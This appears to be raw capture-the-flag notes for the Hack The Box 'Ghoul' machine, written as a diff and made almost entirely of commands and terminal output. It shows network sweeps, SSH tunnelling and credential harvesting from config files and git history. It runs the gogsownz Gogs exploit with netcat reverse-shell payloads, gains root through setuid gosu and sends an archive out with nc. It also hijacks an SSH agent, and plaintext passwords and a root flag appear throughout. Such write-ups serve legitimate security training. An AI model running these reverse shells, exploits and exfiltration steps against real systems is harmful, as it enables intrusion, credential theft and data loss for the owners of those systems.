@@ -1,0 +1,580 @@
+PING SWEEP FOR MORE HOSTS
+
+kaneki@Aogiri:/usr/bin$ for i in $(seq 1 254); do (ping -c 1 172.20.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done
+172.20.0.1
+172.20.0.10
+172.20.0.150
+
+
+CHECK IF WE ARE IN A DOCKER
+
+kaneki@Aogiri:/$ cat /proc/1/cgroup
+12:net_cls,net_prio:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+11:rdma:/
+10:freezer:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+9:blkio:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+8:perf_event:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+7:cpu,cpuacct:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+6:memory:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+5:devices:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+4:hugetlb:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+3:pids:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+2:cpuset:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+1:name=systemd:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+0::/system.slice/docker.service
+
+
+
+
+kaneki_pub@kaneki-pc:/proc/1$ cat /proc/1/cgroup
+12:net_cls,net_prio:/docker/64978af526b2cc276e45e1873a72d9b051383e294830317ed9c96237590f42ae
+11:rdma:/
+10:freezer:/docker/64978af526b2cc276e45e1873a72d9b051383e294830317ed9c96237590f42ae
+9:blkio:/docker/64978af526b2cc276e45e1873a72d9b051383e294830317ed9c96237590f42ae
+8:perf_event:/docker/64978af526b2cc276e45e1873a72d9b051383e294830317ed9c96237590f42ae
+7:cpu,cpuacct:/docker/64978af526b2cc276e45e1873a72d9b051383e294830317ed9c96237590f42ae
+6:memory:/docker/64978af526b2cc276e45e1873a72d9b051383e294830317ed9c96237590f42ae
+5:devices:/docker/64978af526b2cc276e45e1873a72d9b051383e294830317ed9c96237590f42ae
+4:hugetlb:/docker/64978af526b2cc276e45e1873a72d9b051383e294830317ed9c96237590f42ae
+3:pids:/docker/64978af526b2cc276e45e1873a72d9b051383e294830317ed9c96237590f42ae
+2:cpuset:/docker/64978af526b2cc276e45e1873a72d9b051383e294830317ed9c96237590f42ae
+1:name=systemd:/docker/64978af526b2cc276e45e1873a72d9b051383e294830317ed9c96237590f42ae
+0::/system.slice/docker.service
+
+
+kaneki@Aogiri:~$ ./nmap -p- 172.20.0.0/24
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-06-21 15:33 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for Aogiri (172.20.0.1)
+Host is up (0.00042s latency).
+Not shown: 65530 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+2222/tcp  open  unknown
+8080/tcp  open  http-alt
+10007/tcp open  unknown
+
+Nmap scan report for Aogiri (172.20.0.10)
+Host is up (0.00046s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-alt
+
+Nmap scan report for 64978af526b2.Aogiri (172.20.0.150)
+Host is up (0.00043s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 256 IP addresses (3 hosts up) scanned in 13.70 seconds
+kaneki_pub@kaneki-pc:~$ ./nmap -p- 172.20.0.0/24
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-06-21 15:36 GMT
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for Aogiri (172.20.0.1)
+Host is up (0.00057s latency).
+Not shown: 65530 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+2222/tcp  open  unknown
+8080/tcp  open  http-alt
+10007/tcp open  unknown
+
+Nmap scan report for b40e2207e3f4.Aogiri (172.20.0.10)
+Host is up (0.00053s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-alt
+
+Nmap scan report for kaneki-pc (172.20.0.150)
+Host is up (0.00063s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 256 IP addresses (3 hosts up) scanned in 14.89 seconds
+
+DUAL HOMED
+kaneki_pub@kaneki-pc:~$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.20.0.150  netmask 255.255.0.0  broadcast 172.20.255.255
+        ether 02:42:ac:14:00:96  txqueuelen 0  (Ethernet)
+        RX packets 6663  bytes 6518118 (6.5 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 5198  bytes 1016633 (1.0 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.18.0.200  netmask 255.255.0.0  broadcast 172.18.255.255
+        ether 02:42:ac:12:00:c8  txqueuelen 0  (Ethernet)
+        RX packets 315  bytes 55660 (55.6 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 247  bytes 52321 (52.3 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 24  bytes 1344 (1.3 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 24  bytes 1344 (1.3 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+kaneki_pub@kaneki-pc:~$ ./nmap_x86_64 -p- 172.18.0.0/24
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-06-22 12:31 GMT
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for Aogiri (172.18.0.1)
+Host is up (0.00087s latency).
+Not shown: 65530 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+2222/tcp  open  unknown
+8080/tcp  open  http-alt
+10007/tcp open  unknown
+
+Nmap scan report for cuff_web_1.cuff_default (172.18.0.2)
+Host is up (0.00084s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3000/tcp open  unknown
+
+Nmap scan report for kaneki-pc (172.18.0.200)
+Host is up (0.00016s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 256 IP addresses (3 hosts up) scanned in 10.73 seconds
+
+
+DOUBLE TUNELLING
+
+Connect to remote host via Aogiri
+kaneki@Aogiri:~$ ssh -nNT -L 127.0.0.1:1337:172.18.0.2:3000 kaneki_pub@172.20.0.150
+Enter passphrase for key '/home/kaneki/.ssh/id_rsa': 
+
+Connect to remote host via localhost
+root@kali:~/HTB/Ghoul# ssh -nNT -L 1337:127.0.0.1:1337 -i k.backup kaneki@ghoul.htb
+Enter passphrase for key 'k.backup': 
+
+
+Goto browser 127.0.0.1:1337
+
+
+FIND CREDS TO GOGS
+kaneki@Aogiri:~$ find / -iname "*tomcat*" 2>/dev/null
+/usr/share/tomcat7
+/usr/share/tomcat7/bin/tomcat-juli.jar
+/usr/share/tomcat7/bin/tomcat-native.tar.gz
+/usr/share/tomcat7/conf/tomcat-users.xml
+/usr/share/tomcat7/lib/tomcat-i18n-ja.jar
+/usr/share/tomcat7/lib/tomcat-i18n-fr.jar
+/usr/share/tomcat7/lib/tomcat-dbcp.jar
+/usr/share/tomcat7/lib/tomcat-util.jar
+/usr/share/tomcat7/lib/tomcat-api.jar
+/usr/share/tomcat7/lib/tomcat-coyote.jar
+/usr/share/tomcat7/lib/tomcat7-websocket.jar
+/usr/share/tomcat7/lib/tomcat-i18n-es.jar
+/usr/share/tomcat7/lib/tomcat-jdbc.jar
+/var/log/supervisor/tomcat-stdout---supervisor-5oYkej.log
+/var/log/supervisor/tomcat-stderr---supervisor-VoOB_B.log
+kaneki@Aogiri:~$ cat /usr/share/tomcat7/conf/tomcat-users.xml
+<?xml version='1.0' encoding='utf-8'?>
+<!--
+  Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+<tomcat-users>
+<!--
+  NOTE:  By default, no user is included in the "manager-gui" role required
+  to operate the "/manager/html" web application.  If you wish to use this app,
+  you must define such a user - the username and password are arbitrary. It is
+  strongly recommended that you do NOT use one of the users in the commented out
+  section below since they are intended for use with the examples web
+  application.
+-->
+<!--
+  NOTE:  The sample user and role entries below are intended for use with the
+  examples web application. They are wrapped in a comment and thus are ignored
+  when reading this file. If you wish to configure these users for use with the
+  examples web application, do not forget to remove the <!.. ..> that surrounds
+  them. You will also need to set the passwords to something appropriate.
+-->
+<!--
+  <role rolename="tomcat"/>
+  <role rolename="role1"/>
+  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
+  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
+  <user username="role1" password="<must-be-changed>" roles="role1"/>
+-->
+
+  <user username="admin" password="admin" roles="admin" />
+  <role rolename="admin" />
+  <!--<user username="admin" password="test@aogiri123" roles="admin" />
+  <role rolename="admin" />-->
+</tomcat-users>
+kaneki@Aogiri:~$ 
+
+Gogs Server creds
+user: AoGiriTest
+pass: test@aogiri123
+
+
+root@kali:~/toolbox/gogsownz# python3 gogsownz.py http://127.0.0.1:1337 -v -n 'i_like_gogits' -c 'd30507c96b01c8ff' -C 'AogiriTest:test@aogiri123' --rce 'nc -e /bin/sh 10.10.16.45 1338'
+[i] Starting Gogsownz on: http://127.0.0.1:1337
+[+] Loading Gogs homepage
+[i] Gogs Version installed: © 2018 Gogs Version: 0.11.66.0916 
+[i] The Server is redirecting on the login page. Probably REQUIRE_SIGNIN_VIEW is enabled so you will need an account.
+[+] Performing login
+[+] Logged in sucessfully as AogiriTest
+[+] Got UserID 2
+[+] Repository created sucessfully
+[i] Exploiting authenticated PrivEsc...
+[+] Uploading admin session as repository file
+[+] Uploaded successfully.
+[+] Committing the Admin session
+[+] Committed sucessfully
+[i] Signed in as kaneki, is admin True
+[i] Current session cookie: '130a001337'
+[+] Got UserID 1
+[+] Repository created sucessfully
+[+] Setting Git hooks
+[+] Git hooks set sucessfully
+[+] Fetching last commit...
+[+] Got last commit
+[+] Triggering the RCE with a new commit
+[+] Committed sucessfully
+[i] Performed RCE successfully
+[i] Done!
+
+root@kali:~/toolbox/gogsownz# python3 gogsownz.py http://127.0.0.1:1337 -v -n 'i_like_gogits' -c 'd30507c96b01c8ff' -C 'AogiriTest:test@aogiri123' --rce 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.45 1339 >/tmp/f'
+[i] Starting Gogsownz on: http://127.0.0.1:1337
+[+] Loading Gogs homepage
+[i] Gogs Version installed: © 2018 Gogs Version: 0.11.66.0916 
+[i] The Server is redirecting on the login page. Probably REQUIRE_SIGNIN_VIEW is enabled so you will need an account.
+[+] Performing login
+[+] Logged in sucessfully as AogiriTest
+[+] Got UserID 2
+[+] Repository created sucessfully
+[i] Exploiting authenticated PrivEsc...
+[+] Uploading admin session as repository file
+[+] Uploaded successfully.
+[+] Committing the Admin session
+[+] Committed sucessfully
+[i] Signed in as kaneki, is admin True
+[i] Current session cookie: '5723001337'
+[+] Got UserID 1
+[+] Repository created sucessfully
+[+] Setting Git hooks
+[+] Git hooks set sucessfully
+[+] Fetching last commit...
+[+] Got last commit
+[+] Triggering the RCE with a new commit
+
+root@kali:~/HTB/Ghoul# nc -lvp 1339
+listening on [any] 1339 ...
+connect to [10.10.16.45] from ghoul.htb [10.10.10.101] 33673
+/bin/sh: can't access tty; job control turned off
+/data/git/gogs-repositories/kaneki/gogstest.git $ whoami
+git
+/data/git/gogs-repositories/kaneki/gogstest.git $ ls -a
+.
+..
+HEAD
+branches
+config
+custom_hooks
+description
+hooks
+info
+objects
+refs
+/data/git/gogs-repositories/kaneki/gogstest.git $ 
+/bin $ ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:42:AC:12:00:02  
+          inet addr:172.18.0.2  Bcast:172.18.255.255  Mask:255.255.0.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:51915 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:56916 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:3828755 (3.6 MiB)  TX bytes:36609258 (34.9 MiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:40 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:40 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:4660 (4.5 KiB)  TX bytes:4660 (4.5 KiB)
+
+/bin $ uname -a
+Linux 3713ea5e4353 4.15.0-45-generic #48-Ubuntu SMP Tue Jan 29 16:28:13 UTC 2019 x86_64 Linux
+
+/bin $ env
+USER=git
+GIT_EXEC_PATH=/usr/libexec/git-core
+HOSTNAME=3713ea5e4353
+GIT_DIR=.
+SHLVL=6
+OLDPWD=/
+HOME=/data/git
+GOGS_REPO_NAME=gogstest
+GOGS_REPO_ID=3
+_=-a
+SSH_ORIGINAL_COMMAND=1
+GOGS_REPO_CUSTOM_HOOKS_PATH=/data/git/gogs-repositories/kaneki/gogstest.git/custom_hooks
+GOGS_AUTH_USER_EMAIL=kaneki@ghoul.htb
+PATH=/usr/libexec/git-core:/usr/libexec/git-core:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+GOGS_CUSTOM=/data/gogs
+GOGS_AUTH_USER_NAME=kaneki
+GOGS_REPO_OWNER_SALT_MD5=a29c5d55315881d53c922f6f2a269501
+GOGS_REPO_OWNER_NAME=kaneki
+PWD=/bin
+GOGS_AUTH_USER_ID=1
+
+/bin $ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chage
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/expiry
+/usr/sbin/gosu
+/bin/su
+/bin $ /usr/sbin/gosu
+Usage: gosu user-spec command [args]
+   ie: gosu tianon bash
+       gosu nobody:root bash -c 'whoami && id'
+       gosu 1000:1 id
+
+gosu version: 1.10 (go1.7.1 on linux/amd64; gc)
+     license: GPL-3 (full text at https://github.com/tianon/gosu)
+
+/bin $ /usr/sbin/gosu root whoami
+root
+/bin $ 
+/ $ /usr/sbin/gosu root '/bin/sh'
+whoami
+root
+
+ls -a
+.
+..
+.dockerenv
+app
+bin
+data
+dev
+etc
+home
+lib
+media
+mnt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+cd root
+ls -a
+.
+..
+.ash_history
+.bash_history
+aogiri-app.7z
+session.sh
+
+
+Exfil the 7z
+
+create file listener on home box
+root@kali:~/HTB/Ghoul# nc -l -p 1234 > aogiri-app.7z
+
+transfer file
+nc -w 3 10.10.16.45 1234 < aogiri-app.7z
+
+
+cat session.sh
+#!/bin/bash
+while true
+do
+  sleep 300
+  rm -rf /data/gogs/data/sessions
+  sleep 2
+  curl -d 'user_name=kaneki&password=12345ILoveTouka!!!' http://172.18.0.2:3000/user/login
+done
+
+
+Extract 7Z
+7z x <filetoextract>
+
+
+
+root@kali:~/HTB/Ghoul/7z/aogiri-chatapp/src/main/resources# cat application.properties
+server.port=8080
+spring.datasource.url=jdbc:mysql://172.18.0.1:3306/db
+spring.datasource.username=kaneki
+spring.datasource.password=jT7Hr$.[nF.)c)4C
+server.address=0.0.0.0
+
+spring.jpa.properties.hibernate.dialect = org.hibernate.dialect.MySQL5InnoDBDialect
+spring.jpa.hibernate.ddl-auto = validate
+
+spring.servlet.multipart.enabled=true
+spring.servlet.multipart.file-size-threshold=2KB
+spring.servlet.multipart.max-file-size=200MB
+spring.servlet.multipart.max-request-size=215MB
+
+root@kali:~/HTB/Ghoul/7z/aogiri-chatapp# git fsck --lost-found
+Checking object directories: 100% (256/256), done.
+dangling commit 0d426b533d4f1877f8a114620be8a1294f34ab71
+dangling commit 98ecb8ad40e3d47029bfecd3e356d4b880d835e3
+root@kali:~/HTB/Ghoul/7z/aogiri-chatapp# git show
+commit 647c5f1a2f95e117244d9128bff7a579ca1d4968 (HEAD -> master, origin/master)
+Author: kaneki <kaneki@aogiri.htb>
+
+
+root@kali:~/HTB/Ghoul/7z/aogiri-chatapp# git checkout 0d426b533d4f1877f8a114620be8a1294f34ab71
+Note: checking out '0d426b533d4f1877f8a114620be8a1294f34ab71'.
+
+root@kali:~/HTB/Ghoul/7z/aogiri-chatapp/src/main/resources# cat application.properties
+server.port=8080
+spring.datasource.url=jdbc:mysql://localhost:3306/db
+spring.datasource.username=root
+spring.datasource.password=g_xEN$ZuWD7hJf2G
+server.address=0.0.0.0
+
+spring.jpa.properties.hibernate.dialect = org.hibernate.dialect.MySQL5InnoDBDialect
+spring.jpa.hibernate.ddl-auto = validate
+
+spring.servlet.multipart.enabled=true
+spring.servlet.multipart.file-size-threshold=2KB
+spring.servlet.multipart.max-file-size=200MB
+spring.servlet.multipart.max-request-size=215MB
+
+
+root@kali:~/HTB/Ghoul/7z/aogiri-chatapp/src/main/resources# git show 0d426b533d4f1877f8a114620be8a1294f34ab71
+commit 0d426b533d4f1877f8a114620be8a1294f34ab71
+Author: kaneki <kaneki@aogiri.htb>
+Date:   Sat Dec 29 11:44:50 2018 +0530
+
+    update dependencies
+
+diff --git a/pom.xml b/pom.xml
+index 92f24ee..fc1d313 100644
+--- a/pom.xml
++++ b/pom.xml
+@@ -48,6 +48,11 @@
+                        <artifactId>javax.json</artifactId>
+                        <version>1.0</version>
+                </dependency>
++               <dependency>
++                       <groupId>mysql</groupId>
++                       <artifactId>mysql-connector-java</artifactId>
++                       <version>5.1.46</version>
++               </dependency>
+ 
+        </dependencies>
+ 
+diff --git a/src/main/resources/application.properties b/src/main/resources/application.properties
+index 4cbc10b..41adeb0 100644
+--- a/src/main/resources/application.properties
++++ b/src/main/resources/application.properties
+@@ -1,7 +1,7 @@
+ server.port=8080
+ spring.datasource.url=jdbc:mysql://localhost:3306/db
+-spring.datasource.username=kaneki
+-spring.datasource.password=7^Grc%C\7xEQ?tb4
++spring.datasource.username=root
++spring.datasource.password=g_xEN$ZuWD7hJf2G
+ server.address=0.0.0.0
+ 
+ spring.jpa.properties.hibernate.dialect = org.hibernate.dialect.MySQL5InnoDBDialect
+(END)
+
+
+kaneki_pub@kaneki-pc:~$ su root
+Password: 7^Grc%C\7xEQ?tb4
+root@kaneki-pc:/home/kaneki_pub# 
+
+
+
+
+root@kaneki-pc:~# wget http://10.10.16.45:8000/findagent.py .
+--2019-06-26 04:39:47--  http://10.10.16.45:8000/findagent.py
+Connecting to 10.10.16.45:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 536 [text/plain]
+Saving to: ‘findagent.py’
+
+findagent.py                     100%[=========================================================>]     536  --.-KB/s    in 0.02s   
+
+2019-06-26 04:39:50 (28.6 KB/s) - ‘findagent.py’ saved [536/536]
+
+--2019-06-26 04:39:50--  http://./
+Resolving . (.)... failed: Temporary failure in name resolution.
+wget: unable to resolve host address ‘.’
+FINISHED --2019-06-26 04:39:50--
+Total wall clock time: 2.3s
+Downloaded: 1 files, 536 in 0.02s (28.6 KB/s)
+root@kaneki-pc:~# chmod +x findagent.py
+root@kaneki-pc:~# ls -a
+.  ..  .bash_history  .bashrc  .profile  .ssh  .viminfo  findagent.py  root.txt
+root@kaneki-pc:~# python3 findagent.py
+/tmp/ssh-VNtrJKWMhB/agent.259
+root@kaneki-pc:~# export SSH_AUTH_SOCK=/tmp/ssh-VNtrJKWMhB/agent.259
+root@kaneki-pc:~# ssh-add -l
+2048 SHA256:U3NCrv1R4fOSeyIk3W0EcaAm81ETo4dcu5+FBbk3KxE /home/kaneki/.ssh/id_rsa (RSA)
+root@kaneki-pc:~# ssh root@172.18.0.1 -p 2222
+Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-45-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+155 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Tue Jun 25 21:42:02 2019 from 172.18.0.200
+root@Aogiri:~# ls -a
+.  ..  .bash_history  .bashrc  .cache  .gnupg  log.sh  .profile  root.txt  .ssh  .viminfo
+root@Aogiri:~# cat root.txt
+7c0f11041f210f4fadff7c077539e72f
+
